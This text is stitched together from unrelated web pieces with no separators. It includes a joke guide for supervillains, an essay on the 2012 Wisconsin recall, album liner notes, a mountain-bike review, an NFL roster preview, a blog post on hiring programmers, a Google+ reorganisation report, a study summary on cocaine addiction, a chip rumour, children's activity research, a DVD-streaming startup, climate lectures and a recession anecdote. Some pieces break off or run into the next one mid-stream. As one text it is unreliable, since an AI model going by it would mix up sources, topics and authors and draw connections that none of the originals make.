You know you're a successful mad scientist when you declare, "Release the hounds" and the hounds are actually released. But as you know, training the right dog is a time-consuming process. You may want to purchase one from a qualified trainer, such as Trikos or Harrison's K-9, but that could set you back up to $230,000. (That is, $230,000 before you change America's currency from dollars to quatloos.)
Why settle for a pliable pooch or a sedated housecat when you can get something more exotic… like an exotic pet. They may be hard to care for, can carry diseases transmittable to humans, and can grow sharp claws and fangs that cause your gardener to faint on sight. But nothing commands respect like a leashed tiger at your feet.
They can be hard to find, perhaps because ownership of exotic pets may not be legal wherever you set up your evil base of operations. But you can always rent one.
Alternatively, if you're more of the information technology style of supervillain, being able to unleash some dastardly supervirus may qualify as "hounds." (See also: Stuxnet.)
"Speech" "Therapy"
They got past your minions. They downed your bodyguards. They evaded the hounds, and dueled your henchmen. They defeated your robot army, even the laser sharks. It's time for… the speech.
Every aspiring supervillain should know the art of apparently revealing your master plan to the enemy agents at your doorstep while secretly buying time for your escape. This is also your big moment, your chance to shine, your elevator pitch to hell. Obviously, this would be a bad time to choke, or worse, to give a poor speech.
However, it would be far worse to reveal your real intent. And that's where a psychiatrist comes in.
Blabbing your schemes to the very secret agent who can foil them is a professional hazard, but an understandable one: After all, who better to share your laborious, time-consuming, evil plans with than someone who can truly appreciate them?
But if you ever want to unleash the weaponized, Kremlin-tracking dolphins that you spent months to train, you need to share the news with people who are bound by ethics to not reveal them. And after you achieve your grand plan, you can redefine the word "ethics" to suit your needs.
The Plan
Your plan for world domination a little fuzzy on the logistics? There's a surfeit of great software for brainstorming ideas, and mad-science-wannabe sites such as United Nuclear can provide the building blocks for your schemes to better humanity. (They'll see. They'll all see.)
But even a solid plan isn't enough to succeed, as any number of failed businesses, start-ups, and Dr. Evil can testify — particularly if it's a stretch goal like changing the orbit of the Moon or (less ambitiously) world domination. Luckily, there's more than enough project management tips to go around.
And now you now have a "project management" bullet point on your resume, in case that whole "world domination" thing doesn't work out for you.

This story first appeared on the TomDispatch website.
The revelers watched in stunned disbelief, cocktails in hand, dressed for a night to remember. On the big-screen TV a headline screamed in crimson red: “Projected Winner: Scott Walker.” It was 8:49 p.m. In parts of Milwaukee, people learned that news networks had declared Wisconsin's governor the winner while still in line to cast their votes. At the election night party for Walker's opponent, Milwaukee Mayor Tom Barrett, supporters talked and cried and ordered more drinks. Barrett soon took the stage to concede, then waded into the crowd, where a distraught woman slapped him in the face.
Walker is the first governor in American history to win a recall election. His lieutenant governor, Rebecca Kleefisch, dispatched her recall challenger no less decisively. So, too, did three Republican state senators in their recall elections. Democrats avoided a GOP sweep with a win in the sixth and final senate recall vote of the season, in Wisconsin's southeastern 21st District, but that was small consolation. Put simply, Democrats and labor unions got rolled.
The results of Tuesday's elections are being heralded as the death of public-employee unions, if not the death of organized labor itself. Tuesday's results are also seen as the final chapter in the story of the populist uprising that burst into life last year in the state capital of Madison. The Cheddar Revolution, so the argument goes, was buried in a mountain of ballots.
But that burial ceremony may prove premature. Most of the conclusions of the last few days, left and right, are likely wrong.
The energy of the Wisconsin uprising was never electoral. The movement's mistake: letting itself be channeled solely into traditional politics, into the usual box of uninspired candidates and the usual lineup of debates, primaries, and general elections. The uprising was too broad and diverse to fit electoral politics comfortably. You can't play a symphony with a single instrument. Nor can you funnel the energy and outrage of a popular movement into a single race, behind a single well-worn candidate, at a time when all the money in the world from corporate “individuals” and right-wing billionaires is pouring into races like the Walker recall.
Colin Millard, an organizer at the International Brotherhood of Bridge, Structural, Ornamental, and Reinforcing Iron Workers, admitted as much on the eve of the recall. We were standing inside his storefront office in the small town of Horicon, Wisconsin. It was night outside. “The moment you start a recall,” he told me, “you're playing their game by their rules.”
From Madison to Zuccotti Park and Beyond
A recap is in order.
The uprising began with Colin Millard. The date was February 11, 2011, when Walker “dropped the bomb,” as he later put it, with his “budget repair” bill, which sought to gut collective bargaining rights for most public-employee unions, Later that day, a state Democratic Party staffer who knew Millard called him and pleaded with him to organize a protest. Millard agreed, even though other unions, including the AFL-CIO, urged him to back out. Don't make a fuss, they advised. Let's call some lawmakers and urge them to oppose Walker's bill. “Fuck off,” was Millard's response.
On the Sunday after Walker unveiled his bill, Millard rounded up more than 200 people and marched down Lake Street, past the John Deere factory and Dannyboy's Bar, to the home of Republican Jeff Fitzgerald, the speaker of the state Assembly and a Walker ally. Fitzgerald lived a mile or two from Millard in Horicon. “I've got a message for Scott Walker,” Millard told the crowd outside Fitzgerald's house. “This is my union card and you can pry it from my cold, dead hand.”
As rumors spread of more protests, Walker threatened to call out the National Guard to deal with the protesting public workers. That's when popular outrage erupted. Students marched on the state Capitol, and then a local teaching assistants union led the effort to take over the capitol rotunda, transforming intermittent protests into a round-the-clock occupation. Organizers provided food, shelter, health care, day care, education, and a sense of purpose for those who had taken up residence inside the Capitol.
In support of the occupiers, the daily protests outside the Capitol grew into crowds of 10,000, 25,000, then upward of 100,000. People marched in the snowy streets to challenge Walker, Wisconsin Republicans, and their political donors. Tractors circled the Capitol in protest, as did firefighters and cops, even though their bargaining rights had been exempted from Walker's “reform” proposals. By now, Madison had captured the nation's attention.
A two-week occupation of the Capitol and months of protests didn't, however, deter Walker and Republican lawmakers. He signed his budget repair bill, known as Act 10, into law in March. But that doesn't mean the Wisconsin uprising had no effect. For one thing, the “Walkerville” occupation of the grounds outside the state capitol helped inspire the “Bloombergville” protest in New York City targeting Mayor Michael Bloomberg. That, in turn, would be a precursor to the Occupy Wall Street events of the following September and later the Occupy movement nationwide. Without Wisconsin, without the knowledge that such things could still happen in America, there might never have been an Occupy.
Hijacking the Uprising
By the time Occupy Wall Street took off, the Wisconsin uprising had swapped its come-one-come-all organizing message for a far narrower and more traditional political mission. Over the summer of 2011, the decision was made that the energy and enthusiasm displayed in Madison should be channeled into recall elections to defeat six Republican state senators who had voted for Walker's anti-union Act 10. (Three Democratic senators would, in the end, face recall as well.) By that act, Democrats and unions hoped to wrestle control of the senate away from Walker and use that new power to block his agenda.
The Democrats won two of the 2011 recalls, one short of gaining control of the Senate, and so the Republicans clung to their majority.
What followed was more of the same, but with the ante upped. This time, the marquee race would be the recall of Walker himself. Launched last November, the grassroots campaign to recall the governor put the populist heart of the Wisconsin uprising on full display. Organizing under the United Wisconsin banner, 30,000 volunteers statewide gathered nearly 1 million signatures to trigger the election. The group's people-powered operation recaptured some of the spirit of the Capitol occupation, but the decision had been made: recalling Walker at the ballot box was the way forward.
The Walker recall effort would, in fact, splinter the masses of anti-Walker protesters. Many progressives and most of the state's labor unions rallied behind former Dane County executive Kathleen Falk, who in January 2012 announced her intent to challenge Walker. Tom Barrett, who had lost the governor's race to Walker in 2010, didn't announce his candidacy until late March, his entry pitting Democrat against Democrat, his handful of union endorsements pitting labor against labor. Unions pumped $4 million into helping Falk clinch the Democratic nomination. In the end, though, it wasn't close: Barrett stomped her in the May 8 primary by 24 percentage points.
By now, the Madison movement was the captive of ordinary Democratic politics in the state. After all, Barrett was hardly a candidate of the uprising. People who had protested in the streets and slept in the Capitol groused about his uninspired record on workers' rights and public education. He never inspired or unified the movement that had made a recall possible—and it showed on Election Day: Walker beat Barrett by 7 percentage points, almost his exact margin of victory in 2010. Democrats and their union allies needed to win over new voters and old enemies; by all accounts they failed.
And had Barrett by some miracle won, after a few days of celebration and self-congratulation, those in the Madison movement would have found themselves in the same box, in the same broken system, with little sense of what to do and, in a Barrett governorship, little hope. Win or lose, there was loss written all over the recall decision.
The Fate of the Uprising
The takeaway from Walker's decisive win on Tuesday is not that Wisconsin's new populist movement is dead. It's that such a movement does not fit comfortably into the present political/electoral system, stuffed as it is with corporate money, overflowing with bizarre ads and media horse-race-manship. Its members' beliefs are too diverse to be confined in what American electoral politics has become. It simply couldn't be squeezed into a system that stifles and, in some cases, silences the kinds of voices and energies it possessed.
The post-election challenge for the members of Wisconsin's uprising is finding a new way to fight for and achieve needed change without simply pinning their hopes on a candidate or an election. After all, that's part of what absorbed the nation when a bunch of students first moved into the Wisconsin Capitol and wouldn't go home, or when a ragtag crew of protesters camped out in lower Manhattan's Zuccotti Park and wouldn't leave either. In both cases, they had harnessed the outrage felt by so many Americans for a cause other than what's usually called “politics” in this country.
And they were successful—even in the most traditional terms; that is, both movements affected traditional politics most strongly when they weren't part of it. The Occupy movement, for all its flaws, moved even mainstream political discourse away from austerity and deficit slashing and toward the issues of income inequality and the hollowing out of the American middle and working classes.
Avoiding politics as we know it with an almost religious fervor, Occupy still managed to put its stamp on national political fights. Last October, for instance, Ohioans voted overwhelmingly to repeal SB 5, a law that curbed collective bargaining rights for all public-employee unions. Occupy's “We Are the 99 Percent” message reverberated through Ohio, and the volunteers who blitzed the state successfully drew on Occupy themes to make their case for the law's repeal. Mary Kay Henry, president of the Service Employees International Union, which spent $500,000 in Ohio fighting SB 5, told me at the time, “Every conversation was in the context of the 99 percent and the 1 percent, this discussion sparked by Occupy Wall Street.”
The money that flowed into Walker's recall fight speaks loudly to the disadvantages a Wisconsin-like movement faces within the walls of electoral politics and the need for it to resist being confined there. On the post-Citizens United playing field, the unlimited amounts of the money that rose to the top of this society in recent decades, as the 1 percent definitively separated itself from the 99 percent, can be reinvested in preserving the world as it is and electing those who will make it even more amenable. The advantage invariably goes corporate; it goes Republican.
Historically, the Republicans have long been the party of big business, of multinational corporations, of wealthy, union-hating donors like Las Vegas casino mogul Sheldon Adelson and Amway heir Dick DeVos—and in recent decades the Democrats have followed in their wake sweeping up the crumbs (or worse). And here's the reality of a deeply corrupt system: Unless Congress and state legislators act to patch up their tattered campaign finance rule books, the same crew with the same money will continue to dominate the political wars. (And any movement that puts its own money on changing those rules is probably in deep trouble.)
In the wake of the recall losses, the people of Wisconsin's uprising must ask themselves: Where can they make an impact outside of politics? The power of nonviolent action to create social and economic change is well documented, most notably by Jonathan Schell in his classic book The Unconquerable World. The men and women in Schell's invaluable history—Mohandas Gandhi, Martin Luther King Jr. and his civil rights fighters, the Czech dissident Vaclav Havel, and so many others—can serve as guides to a path to change that doesn't require recall elections. Already mainstays of the Madison protests have suggested campaigns to refuse to spend money with businesses that support Walker. “Hit 'em where it hurts. Pocketbooks,” C.J. Terrell, one of the Capitol occupiers, recently wrote on Facebook.
Wisconsinites could also turn to one of their own: Robert “Fightin' Bob” La Follette. He created his own band of “insurgents” within the late 19th- and early 20th-century Republican Party. Together they formed the Progressive Party, which fought for workers' rights, guarded civil liberties, and worked to squeeze corruption out of government.
Ultimately, however, the decision on what comes next rests in the hands of those who inspired and powered the Wisconsin uprising. And with an emboldened Governor Walker, there should be no shortage of reasons to fight back in the next two years. But success, as Tuesday's election made clear, isn't likely to come the traditional way. It will, of course, involve unions; it might draw on state and local political parties. But in the end, it's in the hands of the people again, as it was in February 2011.
The future they want is theirs to decide.

Writing liner notes for a project as spontaneous as this one is somewhat self-defeating. The purpose of liner notes is generally to expound a concept, an innovation, a purpose: we have none of these things.
We met to have a few drinks, breathe the proverbial fresh air and play music, not to record an album. We recorded in a living room, not in a studio, and on one handheld recorder, not an expænsive setup.
There was no playlist, program or concept, but only the projected coherence of our individual musical personalities. We played instruments we didn't know we could play, and played things we didn't know could be instruments. We played music we knew and music we didn't, and hopefully some music that's new.

SFA020 - Stratocluster: Tamanrasset
The BMC Agonist is more evidence that the world of XC is changing. Bikes are becoming more capable and more realistic. But not too much more. Especially in Europe, where efficiency and speed still drive XC bike design and sales, meaning the podium-dwelling Fourstroke will stay in BMC's lineup as their traditional race-winning machine. The Agonist offers a little more travel and a little more attitude.
And I really do mean "a little." The Agonist adds just 10 millimeters of travel to the Fourstroke's XC-standard 100. And its 69.5-degree head angle is just a half-degree slacker. The standover is significantly more generous, and the stack will make you 10 millimeters more comfortable, but aside from adding an XL to the lineup, the rest of the sizing numbers remain almost identical to the Fourstroke. Even the stem lengths and bar widths are in parity with BMC's race thoroughbreds.
The Agonist features some subtle but welcomed design updates. The cables follow internally tubed paths through the front triangle, then across the linkage, into the rear triangle, and will pop out right where you need them every time. The cable to the remote-controlled rear suspension stays invisible until it reaches the upside-down-mounted rear shock.
There's even a flush-mounted mudflap protecting the lower link from trail debris, and equally stealthy hideaway front derailleur mount, if you're into that sort of thing. In fact, two of the three BMC Agonist builds come with front derailleurs, including a carbon front, aluminum rear XT/SLX build for $4,900, or an XT/Deore option for a pretty reasonable $3,900. We rode the full carbon X01 Eagle build, which goes for $7,500.
The Agonist, of course, features BMC's APS linkage. It's tuned for a low leverage ratio and a progressive shock feel. As I set up my Agonist for our day on the trail, I was surprised how little pressure I needed to get my proper sag. And it definitely was progressive. I spent half the day trying to bottom it out.
Riding the BMC Agonist
That day was spent traversing through the Kander Valley in rural Switzerland, BMC's home country. After the traditional product-launch PowerPoint during a very non-traditional private train ride, we set out on a fence-hopping, cow-dodging trek that suited the Agonist's thirst for adventure.
I'll try to bring up the differences between U.S. and European riding styles as little as possible here, but they were especially prevalent on our ride on the Agonist, and on the Agonist itself. Stateside, we trend toward loops and out-and-backs that avoid doubletrack as much as possible. But Swiss fire roads are just too efficient and numerous not to take advantage of. This is why brands like BMC are so fond of remote dual lockout levers. I've never had one on a personal bike, but as they say, when in Rome … .
The Agonist sat high enough in its travel that I only opted to use the remote on pavement. Even the middle setting, which leaves the fork unchanged and firms up the rear end, seemed only useful when I really wanted to hammer. I opted for comfort the rest of the time, especially when our ride occasionally ducked into the woods to climb some rooty singletrack. Rating it purely on its climbing versatility, the Agonist nails it as an endurance-racing machine.
On the descents, the progressivity in the rear end was a little much. The Agonist doesn't lend itself to being bashed around enough to need all that ramp-up, but if ridden with a light touch, 110 millimeters of travel can get plenty done. Anyone willing to sacrifice a little pedaling platform could remove a volume spacer or two, and change the Agonist into something more capable than just an XC bike.
It's just missing one thing: None of the complete Agonists come stock with a dropper post. And if you want to install one with an internal cable, you'll have to cut a small hole in the frame under the hatch that covers the front derailleur mount. It's Ok. They told me I could tell you to do it. Our love affair with dropper posts is another thing that separates U.S. riders with continental Europeans. Of course they use them on their longer-travel bikes, but the overwhelming majority of XC and endurance riders are too weight-conscious and too traditional to embrace droppers.
But the Agonist still does challenge tradition, and it's not alone. This year saw bikes like the Cannondale Scalpel and Rocky Mountain Element show up to challenge XC norms. I felt the same approach to speed when I pushed the Agonist to its limits. However subtle, the extra stability helps keep you in control when amid chaos, and keeps you comfortable when you're pedaling up to find that chaos.
The Agonist isn't a kill-em-all XC bike, and it's not a do-it-all trail bike. It's tailor made to sit in the seldom-served category between them. It's got a natural talent for stacking endless miles on the odometer. Of course, I was stacking kilometers, so it was, like, 1.6 times more epic.

It's dress rehearsal time!
This week, 32 teams across the NFL will compete in their most important preseason game. Starters will see their most playing time of the preseason by far. It's also the last, the best opportunity many veterans will have to remove themselves from the roster bubble and secure a roster spot for 2017.
Yes, there's still a final preseason game to be played next week. But the vast majority of players who take the field for that game will no longer be members of an NFL team by Sept. 2.
When that fateful day arrives, it won't just be journeymen and youngsters who receive their walking papers. As is the case each year, a number of recognizable veteran names will be among the released players.
In 2016, tailback Justin Forsett, offensive guard Josh Sitton and cornerback Dee Milliner wound up on the outside looking in with their respective teams.
In 2017, the following players find themselves on the thinnest of ice as cutdown day looms.
Something has always struck me as a little bit off, about that “statistic” (or its equally unlikely brothers, 199 out of 200, 19 out of 20 etc.). I remember reading Joel's post alluding to this back in the day, then Jeff's a couple of years ago, there were a few others, most recently this one. And as much as I want to just accept it (for reasons of self-aggrandisement), I can't. I've been in this industry for a few years now, in that time, I've met some really good developers, a bunch of average ones, even the odd crappy one, but I am yet to meet the veritable army of totally useless non-programming programmers that must surely exist if those numbers are accurate (the “architects” don't count :P).
Why Should Top Developers Seek You Out?
Whenever I see the latest post about how hard it is to hire good people, because x out of y developers are useless, one question immediately springs to mind. Is that x out of y applicants, or x out of y working developers? There is a massive distinction. Unless you're a company trying to compile stats by doing an industry-wide study, you can't really comment on the skill levels of all working programmers in any authoritative fashion. So, we must be talking about x out of y applicants. But once again, it's not applicants in general it's applicants to YOUR company. All of a sudden the headline is:
X out of Y Applicants for Positions Advertised By My Company Can't Program
That's a whole lot less impressive/sensational and whole lot closer to reality. But, let us dig a little deeper. It's not just the one company, too many other people/companies have had the same pain. Which is perhaps why these posts receive so much attention. It's cathartic to have a bit of a whinge along with a bunch of other people who feel your pain :). My question for everyone is this, what makes your company so special? How much time did you spend making sure your ad was sufficiently attractive to the star developers and a sufficient deterrent to the crappy ones? I can tell you right now the fact that you're the “world's leading enterprise wodget provider”, the latest “well-funded social startup” or pay “above industry rates”, is not going to bring the coding elite knocking on your door. I guess it comes down to this, if you try to attract talent in a generic fashion you will attract a generic response, meaning that there is a decent chance your 200 applicants were ALL a bunch of discards.
Blame Your Interview Process First
Go back to that article of Joel's that I mentioned above where he talks about the 199 useless programmers who apply for every job thereby inflating the applicant numbers. I don't think those 199 wannabe programmers exist, I think the pool is much larger. There is a whole bunch of, let's call them “aspiring programmers” who are totally crap and either can't get a job or can't keep one, which doesn't stop the from trying. A significant percentage of your applicants are those guys and yeah they can't program, but then again I wouldn't really call them “programmers” either. It wouldn't take long to get discouraged and cynical about the whole industry when dealing with those guys for days on end. But let's say you can screen all those out via resumes or whatever and only end up with seemingly legitimate applicants, how come so many of those can't code their way out of a paper bag?
Firstly, you didn't really screen all the discards out via the resumes, that's not possible, I've seen some highly impressive resumes from some highly unimpressive people. All our stats are already suspect at this point, but let's plow on anyway. Likely the next course of action is to screen further via phone or face-to-face or both. We ask simple coding questions like the fizzbuzz, but our applicants still fail – even ones that shouldn't:
“Here is the question that the vast majority of candidates are unable to successfully solve, even in half an hour, even with a lot of nudging in the right direction: _Write a C function that reverses a singly-linked list. _ That's it. We've turned away people with incredibly impressive resumes (including kernel developers, compiler designers, and many a Ph.D. candidate)…“
That's from the RethinkDB post that I also mentioned above (I am not picking on the RethinkDB guys, it is just conveniently the latest post on the subject that I have read :)). Kernel developers, and Ph.Ds can't reverse a list? That seems entirely unlikely. Perhaps it is not the people who are to blame but the process. We have learned, especially over the last few years that it is often the process that prevents a software team from being productive. These days most teams would cast a critical eye towards their process when looking for causes of dysfunction, before they start pointing fingers at each other. So, why not cast the same critical eye towards the interview process? Perhaps the objectives of the interview are unclear, or you're not communicating well enough, or you're using the wrong medium for what you're trying to achieve (e.g. coding over the phone), or you didn't prepare thoroughly enough as an interviewer added to the probable unpreparedness of the interviewee (this chronic unpreparedness is endemic in our industry and deserves a post of it's own). Sounds like the same kind of issues that cause software projects to go off the rails :). My point is, it is not necessarily the fact that the candidate is crappy it could be that you're just doing it wrong.
Just Because It Makes Us Feel Good Doesn't Make It True
As I was thinking about all this stuff I found myself referring to the X out of Y “statistics” as “feel-good numbers” because they make us all feel good about ourselves. I mean, it's pretty sad for the 99 out of 100 poor schlubs, but not you and me – we are coding ninjas. How does it feel to be special :)? Somehow though I don't reckon there are 99 working programmers sitting there reading those posts thinking “…yeah I am a bit of a failure, I wish I was one of those 1 in 100 dudes”. As a decent programmer, look around yourself. Can you really honestly say the vast majority of the developers you're working with have trouble with loops or basic arithmetic? If you can, I fail to see how your company can produce any kind of working software and why are you hanging around that place anyway, it surely is not healthy for your career not to mention your sanity.
If you've read anything I've written before, you know that I am not one to shy away from a generalisation, but in this case I believe it gives a skewed picture that needlessly makes the whole industry look bad. There is no denying that lack of skill can be a problem in software, but then again this is one of the few professional disciplines where you can read a book and “wham bam thank you ma'am”, you're a programmer, or at least think that you are (and might even be able to find work if someone is desperate/stupid enough and you're smooth enough). Try doing the same thing in the medical profession or law, or accounting. This is one of the problems that is unique to IT (other industries have their own), we deal with it to the best of our ability. This issue will always make the hiring process difficult, which makes it doubly as important to think long and hard about how to attract decent people and tweak your interview process to make sure you're getting what you need out of it. And yes it will be time consuming and difficult and will make you feel like you're wasting time instead of doing “real work”, but then again you know what the other side of the coin is.

Today, Google's Vic Gundotra announced that he would be leaving the company after eight years. The first obvious question is where this leaves Google+, Gundotra's baby and primary project for the past several of those years.
What we're hearing from multiple sources is that Google+ will no longer be considered a product, but a platform — essentially ending its competition with other social networks like Facebook and Twitter.
A Google representative has vehemently denied these claims. “Today's news has no impact on our Google+ strategy — we have an incredibly talented team that will continue to build great user experiences across Google+, Hangouts and Photos.”
According to two sources, Google has apparently been reshuffling the teams that used to form the core of Google+, a group numbering between 1,000 and 1,200 employees. We hear that there's a new building on campus, so many of those people are getting moved physically, as well — not necessarily due to Gundotra's departure.
As part of these staff changes, the Google Hangouts team will be moving to the Android team, and it's likely that the photos team will follow, these people said. Basically, talent will be shifting away from the Google+ kingdom and towards Android as a platform, we're hearing.
We've heard Google has not yet decided what to do with the teams not going to Android, and that Google+ is not “officially” dead, more like walking dead: “When you fire the top dog and take away all resources it is what it is.” It will take copious amounts of work for it to un-zombie, if that's even a possibility.
It's not clear, according to our sources' intel, where the rest of the employees will go, but the assumption is that Larry Page will follow Mark Zuckerberg's lead at Facebook and send the bulk of them to mobile roles.
This would telegraph a major acceleration of mobile efforts in general, rather than G+. The teams will apparently be building “widgets,” which take advantage of Google+ as a platform, rather than a focus on G+ as its own integral product.
One big change for Google+ is that there will no longer be a policy of “required” Google+ integrations for Google products, something that has become de rigueur for most product updates.
One impetus of this was that the YouTube integration with Google+ did not go well, something that the public recognized through the comments blowback, but that was also seen inside the company as a rocky move.
That doesn't mean that all G+ integrations will go away, though. Gmail will continue to have it, but there may be some scaling back that keeps the “sign-on” aspects without the heavy-handed pasting over of G+.
We've heard that there were tensions between Gundotra and others inside the company, especially surrounding the “forced” integrations of Google+ into products like YouTube and Gmail. Apparently, once each of those integrations was made, they were initially being claimed as “active user” wins until Page stepped in and made a distinction.
Taking Gundotra's place inside Google will be David Besbris, though we hear that parts of Google+ are under “the person responsible for Chrome,” according to one source. It's not clear if this is Sundar Pichai, Google's head of Chrome and Android, or why this would happen. “It's complicated,” our source said. Google PR denies this account.
We've heard that the acquisition of WhatsApp by Facebook may have been a factor in the phasing out of Gundotra's grand experiment. There was a perception that Google had missed the “biggest acquisition in the social space.” Though another source tells us that Google knew what was up with WhatsApp but simply didn't want to pay out for it.
Google+ is and always has been about turning every Google user into a signed-in Google user, period. If true, these changes dovetail with that focus going forward, with Google+ acting as a backbone rather than a front-end service. That being said, there are a ton of really interesting things going on in Google+ like its efforts in imaging. Having the photos team integrate the technologies backing Google+ photos tightly into the Android camera product, for instance, could be a net win for Android users.
In the long run, the issues with Google+ didn't especially stem from the design of the product itself, but more from the way it interjected itself into your day-to-day Google experience like some unwelcome hairy spider. Perhaps these changes will scale back the grating party crashing?
One of Gundotra's final G+ posts was “On my way to +Coachella.”
A team of researchers says it has solved the longstanding puzzle of why a key protein linked to learning is also needed to become addicted to cocaine. Results of the study, published in the Aug. 1 issue of the journal Cell, describe how the learning-related protein works with other proteins to forge new pathways in the brain in response to a drug-induced rush of the "pleasure" molecule dopamine. By adding important detail to the process of addiction, the researchers, led by a group at Johns Hopkins, say the work may point the way to new treatments.
"The broad question was why and how cocaine strengthened certain circuits in the brain long term, effectively re-wiring the brain for addiction," says Paul Worley, M.D., a professor in the Solomon H. Snyder Department of Neuroscience at the Johns Hopkins University School of Medicine. "What we found in this study was how two very different types of systems in the brain work together to make that happen." Cocaine addiction, experts say, is among the strongest of addictions.
Worley did not come to the problem as an addiction researcher, but as an expert in a group of genes known as immediate early genes, which rapidly ramp up production in neurons when the brain is exposed to new information. In 2001, he said, a European group led by François Conquet of GlaxoSmithKline reported that deleting mGluR5, a protein complex that responds to the common brain-signaling molecule glutamate, made mice unresponsive to cocaine. "That finding came out of the blue," says Worley, who knew mGluR proteins for their interactions with immediate early genes. "I never would have thought this type of protein was linked to dopamine and addiction, because the functions for it that we knew about up to that point were completely unrelated. That's what scientists love: when you're pretty sure something is right, but you don't have a clue why."
The finding set Worley's research group on a long search for an explanation. Eventually, in addition to studying the effects of altering genes for the relevant proteins in mice, they partnered with experts in measuring the brain's electrical signals and in a biophysical technique that detects when chemical bonds are rotated within protein molecules. Using different types of experiments, they pieced together a complex story of how dopamine released in response to cocaine works together with mGluR5 and immediate early genes to switch cells into synapse-strengthening mode.
"The process we identified explains how cocaine exposure can co-opt normal mechanisms of learning to induce addiction," Worley says. Knowing the details of the mechanism may help researchers identify targets for potential drugs to treat addiction, he adds.

A few months back, we had revealed the possible specs of the upcoming Kirin 900 series processors. Now, our source has some information about the Qualcomm's upcoming Snapdragon 815 chipset.
According to our source, the Snapdragon 815 will come with four Cortex A72 cores and four Cortex A53 cores on the big.LITTLE architecture. Unsurprisingly, it will feature the next generation Qualcomm Adreno GPU and will be manufactured using the new FinFet process. So, it could most likely use the 16nm FinFet. Our source also said that Qualcomm may tweak the cores to boost performance.
So, the upcoming Snapdragon 815 will be similar to the Snapdragon 620 which is already launched, but will be manufactured on a smaller node and will have all the features that you can expect from a top end Snapdragon 800 series chipset.
He also says that Qualcomm is delaying the launch of Snapdragon 815 mainly because the company doesn't want to hurt the sales of the 810 powered smartphones in the market such as the HTC One M9 and the LG G Flex 2.
So what do you think about the new Snapdragon 815?
No ball games! And other things that might be making kids less active
by Guest Author on 30 Mar 2016
As part of the Neighbourhoods and Communities programme at the MRC/CSO Social and Public Health Sciences Unit led by Professor Anne Ellaway, Dr Paul McCrorie and PhD student Felicity Hayball are looking at how the local environment may determine levels of physical activity in children. They spoke to Sylvie Kruiniger about their research.
In the UK, increasingly sedentary lifestyles are being shown to impact upon more than just weight. Creating good habits around physical activity from a young age could help people to stay healthy throughout life. So what gets children outside and moving? What do they like to see? What puts them off? Dr Paul McCrorie and Felicity Hayball are using different methods to find out more about how children respond to their built, natural and social environments.
Paul leads on a project called ‘Studying Physical Activity in Children's Environments across Scotland' (SPACES). As part of this, he works with data from the longitudinal study ‘Growing up in Scotland' (GUS) to gather quantitative information on the amount and context of physical activity undertaken by children.
He said: “Working with GUS means that I can access data from over 2000 children who are representative of the whole of Scotland, from Dumfries in the south, right up to the Shetland Islands in the north. In our recent data collection we contacted approximately 2,000 10-year-old children and asked them to wear an accelerometer and GPS device for eight consecutive days. The devices measured how active they were and, importantly for us, used GPS to map where they were active. A common misconception is that GPS provides live information about the whereabouts of its user: worry not – the data from the GPS devices can only be downloaded by the research team at least a week after the activity has taken place.
“When we finish collecting the data in May we will have an internationally-recognised dataset required to conduct complex and innovative analyses regarding the impact of the built and social environment on physical activity levels and behaviours in Scottish children. For instance, do children use parks and green spaces, and how active are they if they do? Does this relationship somehow change depending on where children stay, for example urban cities or rural towns/villages, and affluent or more deprived areas?
“Earlier this month we took the devices to Glasgow Science Centre as part of a ‘Meet the Experts' activity in British Science Week. It was a fantastic chance to tell children about the research and get them involved. The centre's permanent Bodyworks exhibition was the perfect place to do this as there are lots of interactive activities in place where children use physical activity to learn about health and anatomy, including competing on a racetrack against Usain Bolt's times and running in a giant human hamster wheel. Children wore the devices while taking part and we provided customised results to show them how active they were and how this activity contributed to their overall health – a very important message we wanted to get across.”
Felicity's research also sits within the SPACES project and looks at more qualitative elements of how the local environment can affect children's physical activity behaviours. She ran an activity alongside Paul's where she asked 5-11 year olds to draw their favourite thing to do outside. The activity was based on her PhD research where she gave 25 children aged between 10-11 years a sketchbook and a camera and asked them to go out and document their local environment over seven days.
“It was really interesting to get the children's perspectives on different features within their neighbourhood such as roads and playgrounds and how these features influence their physical activity behaviours.
“The children showed photos and drawings of ‘traditional' playgrounds which they described as ‘boring' and ‘too safe'. The children preferred playgrounds where they could climb and jump and feel there was an element of risk. Without the combined photos and descriptions we, as adults, may completely misrepresent what children want; in fact, when I asked the participants if they felt like adults listened to what they wanted to do, they said no!”
Outside of the green spaces, several children wanted to see more cycle lanes so they could use their bikes safely. Others highlighted social problems, like one who drew a road they said they avoided because it was often ‘lined with people drinking and smoking' which made them feel unsafe.
Paul and Felicity hope that their work will stimulate interest from other academics and, importantly, planners and policymakers who can ensure that local environments support physical activity in children.

New startup Zediva attempts to circumvent all the licensing hassles experienced by streaming video services like Netflix, iTunes and Hulu through operating more like a traditional movie rental store, except online.
The catch? “We don't rent digital copies of a movie,” founder Venky Srinivasan told Rotten Tomatoes, “Our users rent a physical DVD, along with a DVD player from us for a fixed amount of time. They then control that DVD player remotely over the internet — and stream the movie privately to themselves. Think of it as a really long cable and a really long remote control.”
The “really long cable” that is the Internet means not having to negotiate with content companies over streaming rights. This loophole means that Zediva can feature more recent releases at a lower price than companies who stream digital files, charging $1.99 for a movie versus $3.99 on iTunes and Blockbuster. Ten movies on Zediva are $10 versus a $7.99 monthly membership to Netflix. Users can freely re-rent a Zediva movie for up to 14 days.
It seems like Srinivasan is serious about the physical DVD legal hack. When I visited the site the movie I wanted to rent, Eat Pray Love, was all rented out, just like in a real brick and mortar store. You can even request to have your physical DVD mailed to you Netflix style, even though “additional charges may apply.”
With around 40 movies in the library at the moment, Zediva is starting small and focusing on offering “the top two or three movies of the week.” Srinivasan doesn't think the startup is breaking digital copyright law, and in fact believes that movie studios will embrace the model. Well, here's to being hopeful, and disruptive.
For those who'd like to get the basics of climate change explained first-hand by a climate scientist, here are two video lectures.
In the first, I show some of the basic data sets and findings about global warming, including some comments on historic landmarks of our science.
The second lecture deals with the impacts of climate change (with a focus on extreme events and sea-level rise) and the possibilities for holding global warming below 2°C.
These lectures form part of a broader lecture course called World in Transition. It includes 11 themes, presented by the members of the German Advisory Council on Global Change (WBGU). This is a body of experts appointed by the German government and advising it on global change issues. The lecture series, for which international students can enrol and earn credit points, is based on the WBGU flagship report World in Transition – A Social Contract for Sustainability. This report describes how the transition to a sustainable, climate-friendly global economy and lifestyle can be achieved.
When Frank Benavides and Lynn Golder had their first baby last year – a cheerful little girl with wide, dark eyes – they agreed that it would be best if one of them could take care of her full time. But they argued, good-naturedly, over who should get the job.Four months later, the recession solved that dispute for them.
In October, Frank, a designer, was summoned into the conference room at his Manhattan architechtural firm. His bosses told him that, although they hated to do it, they were eliminating his position.
"Oh," he said. "OK."
